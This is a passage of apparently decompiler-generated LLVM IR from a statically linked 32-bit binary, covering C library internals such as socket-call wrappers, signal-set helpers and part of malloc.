dec_label_pc_80539fa:                             ; preds = %dec_label_pc_8053978
  %v4_80539fa = trunc i64 %tmp11 to i32
  store i32 %v4_80539fa, i32* @ecx, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  store i32 256, i32* %eax.global-to-local, align 4
  %v10_8053a0d = icmp ugt i32 %v1_80538f3, 256
  %v15_8053a0d = icmp eq i32 %v0_80538f3, 300
  %v2_8053a11 = or i1 %v10_8053a0d, %v15_8053a0d
  br i1 %v2_8053a11, label %dec_label_pc_8053aac, label %dec_label_pc_8053a13

dec_label_pc_8053a13:                             ; preds = %dec_label_pc_80539fa
  %v3_8053a16 = load i32, i32* %stack_var_-76, align 4
  store i32 %v3_8053a16, i32* %stack_var_-108, align 4
  %v1_8053a1a = call i32 @free(i32 %v3_8053a16)
  store i32 %v1_8053a1a, i32* %eax.global-to-local, align 4
  store i32 %v3_8053a16, i32* @edi, align 4
  %v3_8053a20 = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_8053a20, i32* %stack_var_-108, align 4
  %v1_8053a24 = call i32 @free(i32 %v3_8053a20)
  store i32 -1, i32* %v1_8053885, align 4
  store i32 34, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053b24

dec_label_pc_8053aac:                             ; preds = %dec_label_pc_80539fa
  %v3_8053ab1.pre = load i32, i32* %stack_var_-76, align 4
  %v0_8053ab5.pre = load i32, i32* @edi, align 4
  store i32 %v0_8053ab5.pre, i32* %stack_var_-108, align 4
  %v3_8053ab6 = inttoptr i32 %v0_8053ab5.pre to i8*
  %v4_8053ab6 = call i32 @strncpy(i8* %v3_8053ab6, i32 %v3_8053ab1.pre, i32 %v1_80538f3)
  store i32 %v4_8053ab6, i32* %eax.global-to-local, align 4
  store i32 %v0_8053ab5.pre, i32* @ecx, align 4
  %v3_8053abc = load i32, i32* %stack_var_-76, align 4
  store i32 %v3_8053abc, i32* %stack_var_-108, align 4
  %v1_8053ac0 = call i32 @free(i32 %v3_8053abc)
  store i32 %v1_8053ac0, i32* %eax.global-to-local, align 4
  %v12_8053ac8 = icmp eq i32 %tmp10, 1
  %v1_8053acd = icmp eq i1 %v12_8053ac8, false
  br i1 %v1_8053acd, label %dec_label_pc_8053b29, label %dec_label_pc_8053acf

dec_label_pc_8053acf:                             ; preds = %dec_label_pc_8053aac
  %v0_8053acf = load i32, i32* @edx, align 4
  %v0_8053ad6 = load i32, i32* @ebp, align 4
  store i32 %v0_8053ad6, i32* %stack_var_-108, align 4
  %v3_8053ad7 = inttoptr i32 %tmp to i16*
  %v4_8053ad7 = call i32 @memcpy(i16* %v3_8053ad7, i32 4, i32 %v0_8053acf)
  store i32 %tmp18, i32* %eax.global-to-local, align 4
  %v0_8053ae0 = load i32, i32* @edi, align 4
  store i32 %v0_8053ae0, i32* %arg2, align 4
  %v1_8053ae2 = add i32 %tmp18, 8
  %v2_8053ae2 = inttoptr i32 %v1_8053ae2 to i32*
  store i32 2, i32* %v2_8053ae2, align 4
  %v0_8053ae9 = load i32, i32* %eax.global-to-local, align 4
  %v1_8053ae9 = add i32 %v0_8053ae9, 12
  %v2_8053ae9 = inttoptr i32 %v1_8053ae9 to i32*
  store i32 4, i32* %v2_8053ae9, align 4
  %v3_8053af0 = load i32, i32* %stack_var_-92, align 4
  store i32 %v3_8053af0, i32* %edx.global-to-local, align 4
  %v1_8053af4 = load i32, i32* %eax.global-to-local, align 4
  %v2_8053af4 = add i32 %v1_8053af4, 16
  %v3_8053af4 = inttoptr i32 %v2_8053af4 to i32*
  store i32 %v3_8053af0, i32* %v3_8053af4, align 4
  %v1_8053afb = load i32, i32* %eax.global-to-local, align 4
  %v2_8053afb = add i32 %v1_8053afb, 4
  %v3_8053afb = inttoptr i32 %v2_8053afb to i32*
  store i32 %v1_8053906, i32* %v3_8053afb, align 4
  %v2_8053afe = load i32, i32* %stack_var_-108, align 4
  store i32 %v2_8053afe, i32* %eax.global-to-local, align 4
  %v3_8053aff = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_8053aff, i32* %stack_var_-108, align 4
  %v1_8053b03 = call i32 @free(i32 %v3_8053aff)
  store i32 %tmp18, i32* %edx.global-to-local, align 4
  store i32 %tmp18, i32* %v1_8053837, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 %arg6, i32* @ecx, align 4
  store i32 0, i32* %v1_8053885, align 4
  br label %dec_label_pc_8053b24

dec_label_pc_8053b24:                             ; preds = %dec_label_pc_8053b29, %dec_label_pc_8053a13, %dec_label_pc_8053acf
  br label %dec_label_pc_8053b4e

dec_label_pc_8053b29:                             ; preds = %dec_label_pc_8053aac
  %v3_8053b2c = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_8053b2c, i32* %stack_var_-108, align 4
  %v1_8053b30 = call i32 @free(i32 %v3_8053b2c)
  store i32 1, i32* %v1_8053885, align 4
  store i32 2, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053b24

dec_label_pc_8053b49:                             ; preds = %dec_label_pc_80538f3, %dec_label_pc_80538d7, %dec_label_pc_80538cb, %dec_label_pc_80538b8, %dec_label_pc_80538ac
  store i32 34, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053b4e

dec_label_pc_8053b4e:                             ; preds = %dec_label_pc_8053898, %dec_label_pc_8053891, %dec_label_pc_805384d, %entry, %dec_label_pc_8053b24, %dec_label_pc_80539e6, %dec_label_pc_8053940, %dec_label_pc_8053b49
  store i32 %v0_8053827, i32* @ebx, align 4
  store i32 %v0_8053826, i32* @esi, align 4
  store i32 %v0_8053825, i32* @edi, align 4
  store i32 %v0_8053824, i32* @ebp, align 4
  %v0_8053b55 = load i32, i32* %eax.global-to-local, align 4
  ret i32 %v0_8053b55

; uselistorder directives
  uselistorder i32 %v2_8053988, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v1_805390d, { 1, 0, 2 }
  uselistorder i32 %v1_8053906, { 1, 0 }
  uselistorder i32 %v1_80538f3, { 1, 3, 2, 0, 4 }
  uselistorder i32 %v0_80538bc.pre, { 0, 2, 1 }
  uselistorder i32 %v1_80538a5, { 1, 0 }
  uselistorder i32 %v2_8053885, { 2, 0, 1, 3 }
  uselistorder i32* %v1_8053885, { 5, 4, 3, 2, 1, 0, 6 }
  uselistorder i32* %v1_8053837, { 1, 0, 2 }
  uselistorder i32* %stack_var_-76, { 1, 0, 2, 3 }
  uselistorder i32 %tmp18, { 6, 5, 0, 4, 1, 3, 2 }
  uselistorder i32* %eax.global-to-local, { 27, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 28 }
  uselistorder i32 %arg6, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %arg5, { 2, 0, 1 }
  uselistorder i32 %arg1, { 5, 4, 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_8053b4e, { 7, 4, 5, 6, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_8053b24, { 0, 2, 1 }
  uselistorder label %dec_label_pc_80538b8, { 1, 0 }
}

define i32 @__libc_connect(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-12, align 4
  %v2_8053b73 = ptrtoint i32* %stack_var_-12 to i32
  %v2_8053b7a = call i32 @__socketcall(i32 3, i32 %v2_8053b73)
  ret i32 %v2_8053b7a

; uselistorder directives
  uselistorder i32* %stack_var_-12, { 1, 0 }
}

define i32 @__GI_getsockname(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-12, align 4
  %v2_8053b9f = ptrtoint i32* %stack_var_-12 to i32
  %v2_8053ba6 = call i32 @__socketcall(i32 6, i32 %v2_8053b9f)
  ret i32 %v2_8053ba6

; uselistorder directives
  uselistorder i32* %stack_var_-12, { 1, 0 }
}

define i32 @getsockopt(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-20, align 4
  %v2_8053bdb = ptrtoint i32* %stack_var_-20 to i32
  %v2_8053be2 = call i32 @__socketcall(i32 15, i32 %v2_8053bdb)
  ret i32 %v2_8053be2

; uselistorder directives
  uselistorder i32* %stack_var_-20, { 1, 0 }
}

define i32 @__libc_recv(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-16, align 4
  %v2_8053c0f = ptrtoint i32* %stack_var_-16 to i32
  %v2_8053c16 = call i32 @__socketcall(i32 10, i32 %v2_8053c0f)
  ret i32 %v2_8053c16

; uselistorder directives
  uselistorder i32* %stack_var_-16, { 1, 0 }
}

define i32 @__libc_send(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-16, align 4
  %v2_8053c43 = ptrtoint i32* %stack_var_-16 to i32
  %v2_8053c4a = call i32 @__socketcall(i32 9, i32 %v2_8053c43)
  ret i32 %v2_8053c4a

; uselistorder directives
  uselistorder i32* %stack_var_-16, { 1, 0 }
}

define i32 @__libc_sendto(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-24, align 4
  %v2_8053c87 = ptrtoint i32* %stack_var_-24 to i32
  %v2_8053c8e = call i32 @__socketcall(i32 11, i32 %v2_8053c87)
  ret i32 %v2_8053c8e

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0 }
}

define i32 @__GI_setsockopt(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-20, align 4
  %v2_8053cc3 = ptrtoint i32* %stack_var_-20 to i32
  %v2_8053cca = call i32 @__socketcall(i32 14, i32 %v2_8053cc3)
  ret i32 %v2_8053cca

; uselistorder directives
  uselistorder i32* %stack_var_-20, { 1, 0 }
}

define i32 @socket(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-12, align 4
  %v2_8053cef = ptrtoint i32* %stack_var_-12 to i32
  %v2_8053cf6 = call i32 @__socketcall(i32 1, i32 %v2_8053cef)
  ret i32 %v2_8053cf6

; uselistorder directives
  uselistorder i32* %stack_var_-12, { 1, 0 }
  uselistorder i32 (i32, i32)* @__socketcall, { 2, 6, 5, 0, 1, 4, 7, 3 }
}

define i32 @__GI_sigaddset(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp3 = icmp slt i32 %arg1, 1
  br i1 %tmp3, label %dec_label_pc_8053d18, label %dec_label_pc_8053d0b

dec_label_pc_8053d0b:                             ; preds = %entry
  %v1_8053d0b = add i32 %arg1, -64
  %v3_8053d0b = sub i32 63, %arg1
  %v4_8053d0b = and i32 %v3_8053d0b, %arg1
  %v5_8053d0b = icmp slt i32 %v4_8053d0b, 0
  %v6_8053d0b = icmp eq i32 %v1_8053d0b, 0
  %v7_8053d0b = icmp slt i32 %v1_8053d0b, 0
  %v3_8053d0e = icmp eq i1 %v7_8053d0b, %v5_8053d0b
  %v4_8053d0e = icmp eq i1 %v6_8053d0b, false
  %v5_8053d0e = and i1 %v4_8053d0e, %v3_8053d0e
  br i1 %v5_8053d0e, label %dec_label_pc_8053d18, label %dec_label_pc_8053d10

dec_label_pc_8053d10:                             ; preds = %dec_label_pc_8053d0b
  %v4_8053d13 = call i32 @__sigaddset(i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_8053d18

dec_label_pc_8053d18:                             ; preds = %dec_label_pc_8053d0b, %entry, %dec_label_pc_8053d10
  %v1_8053d18 = call i32 @__errno_location(i32 ptrtoint (i32* @0 to i32))
  %v1_8053d1d = inttoptr i32 %v1_8053d18 to i32*
  store i32 22, i32* %v1_8053d1d, align 4
  ret i32 -1

; uselistorder directives
  uselistorder i32 %v1_8053d0b, { 1, 0 }
  uselistorder i32 -64, { 1, 0 }
  uselistorder i32 %arg1, { 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_8053d18, { 2, 0, 1 }
}

define i32 @sigemptyset(i32 %arg1) local_unnamed_addr {
entry:
  %v3_8053d3a = inttoptr i32 %arg1 to i8*
  %v4_8053d3a = call i32 @__GI_memset(i8* %v3_8053d3a, i32 0, i32 128)
  ret i32 0
}

define i32 @__bsd_signal(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-284 = alloca i32, align 4
  %stack_var_-140 = alloca i32, align 4
  %stack_var_-300 = alloca i32, align 4
  %v0_8053d48 = load i32, i32* @ebx, align 4
  %v15_8053d49 = ptrtoint i32* %stack_var_-300 to i32
  store i32 %arg2, i32* %eax.global-to-local, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v10_8053d5d = icmp eq i32 %arg2, -1
  br i1 %v10_8053d5d, label %dec_label_pc_8053d6b, label %dec_label_pc_8053d62

dec_label_pc_8053d62:                             ; preds = %entry
  %tmp16 = icmp slt i32 %arg1, 1
  br i1 %tmp16, label %dec_label_pc_8053d6b, label %dec_label_pc_8053d66

dec_label_pc_8053d66:                             ; preds = %dec_label_pc_8053d62
  %v7_8053d69 = icmp sgt i32 %arg1, 64
  br i1 %v7_8053d69, label %dec_label_pc_8053d6b, label %dec_label_pc_8053d78

dec_label_pc_8053d6b:                             ; preds = %dec_label_pc_8053d66, %dec_label_pc_8053d62, %entry
  %v1_8053d6b = call i32 @__errno_location(i32 %v0_8053d48)
  store i32 %v1_8053d6b, i32* %eax.global-to-local, align 4
  %v1_8053d70 = inttoptr i32 %v1_8053d6b to i32*
  store i32 22, i32* %v1_8053d70, align 4
  br label %dec_label_pc_8053dec

dec_label_pc_8053d78:                             ; preds = %dec_label_pc_8053d66
  store i32 %arg2, i32* %stack_var_-144, align 4
  store i32 31, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053d86

dec_label_pc_8053d86:                             ; preds = %dec_label_pc_8053d86.dec_label_pc_8053d86_crit_edge, %dec_label_pc_8053d78
  %v0_8053d86 = phi i32 [ %v15_8053d49, %dec_label_pc_8053d78 ], [ %v0_8053d86.pre, %dec_label_pc_8053d86.dec_label_pc_8053d86_crit_edge ]
  %v1_8053d9117 = phi i32 [ 31, %dec_label_pc_8053d78 ], [ %v1_8053d91, %dec_label_pc_8053d86.dec_label_pc_8053d86_crit_edge ]
  %v2_8053d86 = mul i32 %v1_8053d9117, 4
  %v3_8053d86 = add i32 %v2_8053d86, 160
  %v4_8053d86 = add i32 %v3_8053d86, %v0_8053d86
  %v5_8053d86 = inttoptr i32 %v4_8053d86 to i32*
  store i32 0, i32* %v5_8053d86, align 4
  %v0_8053d91.pre = load i32, i32* %eax.global-to-local, align 4
  %v1_8053d91 = add i32 %v0_8053d91.pre, -1
  %v9_8053d91 = icmp slt i32 %v1_8053d91, 0
  store i32 %v1_8053d91, i32* %eax.global-to-local, align 4
  %v1_8053d92 = icmp eq i1 %v9_8053d91, false
  br i1 %v1_8053d92, label %dec_label_pc_8053d86.dec_label_pc_8053d86_crit_edge, label %dec_label_pc_8053d94

dec_label_pc_8053d86.dec_label_pc_8053d86_crit_edge: ; preds = %dec_label_pc_8053d86
  %v0_8053d86.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8053d86

dec_label_pc_8053d94:                             ; preds = %dec_label_pc_8053d86
  %v0_8053d94 = load i32, i32* @edx, align 4
  %v2_8053d97 = ptrtoint i32* %stack_var_-140 to i32
  store i32 %v2_8053d97, i32* %eax.global-to-local, align 4
  %v4_8053d9f = call i32 @__sigaddset(i32 %v2_8053d97, i32 %arg1, i32 %v0_8053d94, i32 %v0_8053d94)
  store i32 %v4_8053d9f, i32* %eax.global-to-local, align 4
  %v2_8053da7 = icmp slt i32 %v4_8053d9f, 0
  br i1 %v2_8053da7, label %dec_label_pc_8053dec, label %dec_label_pc_8053dab

dec_label_pc_8053dab:                             ; preds = %dec_label_pc_8053d94
  %v4_8053db3 = call i32 @__sigismember(i32 ptrtoint (i32* @global_var_8065780.956 to i32), i32 %arg1, i32 %v4_8053d9f, i32 %v4_8053d9f)
  %v2_8053dcc = ptrtoint i32* %stack_var_-284 to i32
  %v2_8053dd1 = ptrtoint i32* %stack_var_-144 to i32
  store i32 %v2_8053dd1, i32* %eax.global-to-local, align 4
  %v4_8053dda = call i32 @__libc_sigaction(i32 %arg1, i32* nonnull %stack_var_-144, i32 %v2_8053dcc)
  store i32 %v4_8053dda, i32* %eax.global-to-local, align 4
  %v2_8053de2 = icmp slt i32 %v4_8053dda, 0
  br i1 %v2_8053de2, label %dec_label_pc_8053dec, label %dec_label_pc_8053de6

dec_label_pc_8053de6:                             ; preds = %dec_label_pc_8053dab
  %v3_8053de6 = load i32, i32* %stack_var_-284, align 4
  br label %dec_label_pc_8053def

dec_label_pc_8053dec:                             ; preds = %dec_label_pc_8053dab, %dec_label_pc_8053d94, %dec_label_pc_8053d6b
  br label %dec_label_pc_8053def

dec_label_pc_8053def:                             ; preds = %dec_label_pc_8053de6, %dec_label_pc_8053dec
  %storemerge = phi i32 [ -1, %dec_label_pc_8053dec ], [ %v3_8053de6, %dec_label_pc_8053de6 ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  store i32 %v0_8053d48, i32* @ebx, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_8053d91, { 2, 1, 0 }
  uselistorder i32* %stack_var_-144, { 0, 2, 1 }
  uselistorder i32* %eax.global-to-local, { 9, 0, 1, 2, 3, 4, 7, 8, 5, 6 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 3, 4, 1, 2, 0, 5 }
  uselistorder label %dec_label_pc_8053def, { 1, 0 }
}

define i32 @__sigismember(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v1_8053e06 = add i32 %arg2, -1
  %v1_8053e09 = urem i32 %v1_8053e06, 32
  %v2_8053e09 = icmp eq i32 %v1_8053e09, 0
  %v2_8053e0c = udiv i32 %v1_8053e06, 32
  br i1 %v2_8053e09, label %bb5, label %bb

bb:                                               ; preds = %entry
  %v5_8053e0f = shl i32 1, %v1_8053e09
  br label %bb5

bb5:                                              ; preds = %entry, %bb
  %v6_8053e11 = phi i32 [ 1, %entry ], [ %v5_8053e0f, %bb ]
  %v2_8053e11 = mul nuw nsw i32 %v2_8053e0c, 4
  %v3_8053e11 = add i32 %v2_8053e11, %arg1
  %v4_8053e11 = inttoptr i32 %v3_8053e11 to i32*
  %v5_8053e11 = load i32, i32* %v4_8053e11, align 4
  %v7_8053e11 = and i32 %v5_8053e11, %v6_8053e11
  %v8_8053e11 = icmp eq i32 %v7_8053e11, 0
  %v1_8053e15 = icmp eq i1 %v8_8053e11, false
  %v2_8053e15 = zext i1 %v1_8053e15 to i32
  ret i32 %v2_8053e15

; uselistorder directives
  uselistorder i32 %v1_8053e09, { 1, 0 }
  uselistorder label %bb5, { 1, 0 }
}

define i32 @__sigaddset(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_8053e1c = load i32, i32* @ebx, align 4
  store i32 %v0_8053e1c, i32* %stack_var_-4, align 4
  %v1_8053e2a = add i32 %arg2, -1
  %v1_8053e2d = urem i32 %v1_8053e2a, 32
  %v2_8053e2d = icmp eq i32 %v1_8053e2d, 0
  store i32 %v1_8053e2d, i32* @ecx, align 4
  br i1 %v2_8053e2d, label %bb6, label %bb

bb:                                               ; preds = %entry
  %v5_8053e30 = shl i32 1, %v1_8053e2d
  br label %bb6

bb6:                                              ; preds = %entry, %bb
  %v6_8053e35 = phi i32 [ 1, %entry ], [ %v5_8053e30, %bb ]
  %v2_8053e32 = udiv i32 %v1_8053e2a, 32
  store i32 %v2_8053e32, i32* @edx, align 4
  %v2_8053e35 = mul nuw nsw i32 %v2_8053e32, 4
  %v3_8053e35 = add i32 %v2_8053e35, %arg1
  %v4_8053e35 = inttoptr i32 %v3_8053e35 to i32*
  %v5_8053e35 = load i32, i32* %v4_8053e35, align 4
  %v7_8053e35 = or i32 %v5_8053e35, %v6_8053e35
  store i32 %v7_8053e35, i32* %v4_8053e35, align 4
  %v2_8053e3a = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8053e3a, i32* @ebx, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v2_8053e32, { 1, 0 }
  uselistorder i32 %v1_8053e2d, { 2, 1, 0 }
  uselistorder label %bb6, { 1, 0 }
}

define i32 @__sigdelset(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_8053e4a = add i32 %arg2, -1
  %v1_8053e4d = urem i32 %v1_8053e4a, 32
  %v2_8053e4d = icmp eq i32 %v1_8053e4d, 0
  br i1 %v2_8053e4d, label %bb6, label %bb

bb:                                               ; preds = %entry
  %v4_8053e50 = shl i32 -2, %v1_8053e4d
  %v5_8053e50 = sub nsw i32 32, %v1_8053e4d
  %v6_8053e50 = lshr i32 -2, %v5_8053e50
  %v7_8053e50 = or i32 %v6_8053e50, %v4_8053e50
  br label %bb6

bb6:                                              ; preds = %entry, %bb
  %v6_8053e55 = phi i32 [ -2, %entry ], [ %v7_8053e50, %bb ]
  %v2_8053e52 = udiv i32 %v1_8053e4a, 32
  %v2_8053e55 = mul nuw nsw i32 %v2_8053e52, 4
  %v3_8053e55 = add i32 %v2_8053e55, %arg1
  %v4_8053e55 = inttoptr i32 %v3_8053e55 to i32*
  %v5_8053e55 = load i32, i32* %v4_8053e55, align 4
  %v7_8053e55 = and i32 %v5_8053e55, %v6_8053e55
  store i32 %v7_8053e55, i32* %v4_8053e55, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_8053e4d, { 1, 2, 0 }
  uselistorder label %bb6, { 1, 0 }
}

define i32 @__malloc_largebin_index() local_unnamed_addr {
entry:
  %v0_8053e5c = load i32, i32* @eax, align 4
  %v6_8053e6f = icmp ugt i32 %v0_8053e5c, 16777215
  br i1 %v6_8053e6f, label %dec_label_pc_8053e80, label %dec_label_pc_8053e71

dec_label_pc_8053e71:                             ; preds = %entry
  %tmp = icmp ult i32 %v0_8053e5c, 256
  %v2_8053e5e = udiv i32 %v0_8053e5c, 256
  %v2_8053e71 = call i32 @llvm.ctlz.i32(i32 %v2_8053e5e, i1 true)
  %v3_8053e71 = xor i32 %v2_8053e71, 31
  %v5_8053e71 = select i1 %tmp, i32 95, i32 %v3_8053e71
  %v1_8053e74 = add nuw nsw i32 %v5_8053e71, 6
  store i32 %v1_8053e74, i32* @ecx, align 4
  %v2_8053e77 = urem i32 %v1_8053e74, 32
  %v4_8053e77 = icmp eq i32 %v2_8053e77, 0
  br i1 %v4_8053e77, label %bb4, label %bb

bb:                                               ; preds = %dec_label_pc_8053e71
  %v5_8053e77 = lshr i32 %v0_8053e5c, %v2_8053e77
  br label %bb4

bb4:                                              ; preds = %dec_label_pc_8053e71, %bb
  %v0_8053e79 = phi i32 [ %v0_8053e5c, %dec_label_pc_8053e71 ], [ %v5_8053e77, %bb ]
  %v1_8053e79 = urem i32 %v0_8053e79, 4
  %v2_8053e7c = mul nuw nsw i32 %v5_8053e71, 4
  %v3_8053e7c = or i32 %v1_8053e79, 32
  %v4_8053e7c = add nuw nsw i32 %v3_8053e7c, %v2_8053e7c
  br label %dec_label_pc_8053e80

dec_label_pc_8053e80:                             ; preds = %entry, %bb4
  %v0_8053e81 = phi i32 [ 95, %entry ], [ %v4_8053e7c, %bb4 ]
  ret i32 %v0_8053e81

; uselistorder directives
  uselistorder i32 %v2_8053e77, { 1, 0 }
  uselistorder i32 %v0_8053e5c, { 2, 3, 1, 0, 4 }
  uselistorder label %dec_label_pc_8053e80, { 1, 0 }
  uselistorder label %bb4, { 1, 0 }
}

define i32 @malloc(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-92 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_8053e82 = load i32, i32* @ebp, align 4
  %v0_8053e83 = load i32, i32* @edi, align 4
  %v0_8053e84 = load i32, i32* @esi, align 4
  %v0_8053e85 = load i32, i32* @ebx, align 4
  store i32 %v0_8053e85, i32* %stack_var_-16, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v2_8053e97 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_8053e97, i32* @eax, align 4
  store i32 %v2_8053e97, i32* %stack_var_-92, align 4
  %v2_8053e9c = call i32 @__pthread_return_void(i32 %v2_8053e97, i32 134567199)
  store i32 %v2_8053e9c, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_805f390.957 to i32), i32* %stack_var_-92, align 4
  %v1_8053ea8 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_805f390.957 to i32))
  store i32 %v1_8053ea8, i32* %eax.global-to-local, align 4
  %v0_8053eb0 = load i32, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v0_8053eb0, -32
  br i1 %tmp, label %dec_label_pc_8053ec7, label %dec_label_pc_8053eb5

dec_label_pc_8053eb5:                             ; preds = %entry
  %v0_8053eb5 = load i32, i32* %stack_var_-92, align 4
  %v1_8053eb5 = call i32 @__errno_location(i32 %v0_8053eb5)
  store i32 %v1_8053eb5, i32* %eax.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v1_8053ebc = inttoptr i32 %v1_8053eb5 to i32*
  store i32 12, i32* %v1_8053ebc, align 4
  br label %dec_label_pc_805461a

dec_label_pc_8053ec7:                             ; preds = %entry
  %v1_8053ec7 = add i32 %v0_8053eb0, 11
  %tmp136 = icmp ult i32 %v1_8053ec7, 16
  br i1 %tmp136, label %dec_label_pc_8053ede, label %dec_label_pc_8053ed7

dec_label_pc_8053ed7:                             ; preds = %dec_label_pc_8053ec7
  %v1_8053ed7 = and i32 %v1_8053ec7, -8
  br label %dec_label_pc_8053ede

dec_label_pc_8053ede:                             ; preds = %dec_label_pc_8053ec7, %dec_label_pc_8053ed7
  %storemerge133 = phi i32 [ %v1_8053ed7, %dec_label_pc_8053ed7 ], [ %v1_8053ec7, %dec_label_pc_8053ec7 ]
  %v1_805427e = phi i32 [ %v1_8053ed7, %dec_label_pc_8053ed7 ], [ 16, %dec_label_pc_8053ec7 ]
  store i32 %storemerge133, i32* %eax.global-to-local, align 4
  %v0_8053ede = load i8, i8* @global_var_8065800.958, align 1
  %v1_8053ede = sext i8 %v0_8053ede to i32
  store i32 %v1_8053ede, i32* @ebx, align 4
  %v3_8053ee4 = urem i8 %v0_8053ede, 2
  %v4_8053ee4 = icmp eq i8 %v3_8053ee4, 0
  %v1_8053ee7 = icmp eq i1 %v4_8053ee4, false
  br i1 %v1_8053ee7, label %dec_label_pc_8053f06, label %dec_label_pc_8053ee9

dec_label_pc_8053ee9:                             ; preds = %dec_label_pc_8053ede
  %v2_8053ee9 = icmp eq i8 %v0_8053ede, 0
  %v1_8053eeb = icmp eq i1 %v2_8053ee9, false
  br i1 %v1_8053eeb, label %dec_label_pc_80541e9, label %dec_label_pc_8053ef1

dec_label_pc_8053ef1:                             ; preds = %dec_label_pc_8053ee9
  store i32 ptrtoint (i8* @global_var_8065800.958 to i32), i32* %stack_var_-92, align 4
  %v2_8053ef9 = call i32 @__malloc_consolidate(i32* bitcast (i8* @global_var_8065800.958 to i32*))
  store i32 %v2_8053ef9, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80541e9

dec_label_pc_8053f06:                             ; preds = %dec_label_pc_8053ede
  %v11_8053f06 = trunc i32 %v1_805427e to i8
  %v8_8053f0a = icmp ugt i8 %v11_8053f06, %v0_8053ede
  br i1 %v8_8053f0a, label %dec_label_pc_8053f27, label %dec_label_pc_8053f0c

dec_label_pc_8053f0c:                             ; preds = %dec_label_pc_8053f06
  %v2_8053f10 = udiv i32 %v1_805427e, 2
  store i32 %v2_8053f10, i32* %eax.global-to-local, align 4
  %v1_8053f12 = add i32 %v2_8053f10, ptrtoint (i8* @global_var_8065800.958 to i32)
  store i32 %v1_8053f12, i32* @ecx, align 4
  %v1_8053f18 = add i32 %v2_8053f10, add (i32 ptrtoint (i8* @global_var_8065800.958 to i32), i32 -4)
  %v2_8053f18 = inttoptr i32 %v1_8053f18 to i32*
  %v3_8053f18 = load i32, i32* %v2_8053f18, align 4
  store i32 %v3_8053f18, i32* @edx, align 4
  %v1_8053f1b = icmp eq i32 %v3_8053f18, 0
  br i1 %v1_8053f1b, label %dec_label_pc_8053f27, label %dec_label_pc_8053f1f

dec_label_pc_8053f1f:                             ; preds = %dec_label_pc_8053f0c
  %v1_8053f1f = add i32 %v3_8053f18, 8
  %v2_8053f1f = inttoptr i32 %v1_8053f1f to i32*
  %v3_8053f1f = load i32, i32* %v2_8053f1f, align 4
